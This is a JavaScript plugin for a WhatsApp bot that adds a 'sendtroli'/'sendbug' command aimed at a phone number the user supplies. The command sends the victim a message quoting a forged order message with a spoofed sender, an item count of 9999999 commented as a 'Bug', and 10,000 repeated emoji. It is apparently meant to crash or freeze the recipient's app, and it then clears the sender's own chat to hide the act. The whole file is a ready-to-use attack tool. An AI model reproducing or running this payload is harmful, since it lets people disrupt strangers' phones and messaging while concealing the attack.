const sendTroliHandler = async (m, { conn, text, usedPrefix, command }) => {
  if (!text) throw `Format Salah!!\nContoh : ${usedPrefix + command} 62xxxxx`;

  const troliMessage = {
    key: {
      participant: '0@s.whatsapp.net', // Fake sender Jid
      remoteJid: 'status@broadcast',
    },
    message: {
      orderMessage: {
        itemCount: 9999999, // Bug
        status: 1,
        surface: 1,
        message: '🔥'.repeat(10000),
        orderTitle: 'Tsukasa-BOT', // Idk what this does
        sellerJid: '0@s.whatsapp.net', // Seller
      },
    },
  };

  const phoneNumber = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

  conn.sendMessage(phoneNumber, 'Hai Kak', 'conversation', { quoted: troliMessage })
    .then(v => conn.modifyChat(v.key.remoteJid, 'clear'));
};

sendTroliHandler.help = ['sendbug <nomor>', 'sendtroli <nomor>'];
sendTroliHandler.tags = ['tools'];
sendTroliHandler.command = /^(sendtroli)$/i;
sendTroliHandler.owner = false;
sendTroliHandler.premium = true;
sendTroliHandler.private = true;

export default sendTroliHandler;
